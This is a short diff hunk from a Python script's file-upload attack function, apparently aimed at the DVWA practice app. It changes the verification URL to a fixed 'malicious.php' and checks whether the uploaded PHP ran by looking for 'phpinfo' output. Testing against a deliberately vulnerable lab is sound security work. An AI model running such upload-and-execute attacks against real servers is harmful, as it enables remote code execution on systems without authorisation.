@@ -93,7 +93,7 @@ def upload_file_attack():
         time.sleep(delay)
         
         # Attempt to execute the uploaded file
-        verify_url = f"{base_url}/hackable/uploads/{file_path}"
+        verify_url = f"{base_url}/hackable/uploads/malicious.php"
         exec_response = session.get(verify_url)
         total_tests += 1
         if "phpinfo" in exec_response.text:
